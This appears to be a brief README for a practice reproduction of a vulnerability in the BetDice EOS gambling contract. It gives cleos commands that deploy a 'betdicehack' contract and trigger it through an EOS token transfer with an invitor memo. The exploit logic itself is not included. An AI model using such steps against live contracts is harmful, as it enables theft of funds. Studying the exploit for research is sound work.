# Introduction(简介)
betdic合约漏洞实践

# Operation(操作)
```
cleos set contract contractaccount betdicehack
//下面的EOS转账会调用contractaccount这个智能合约的transfer方法
cleos push action eosio.token transfer '["testaccount", "contractaccount", "3.0000 EOS", "50-invitor"]' -p testaccount
```
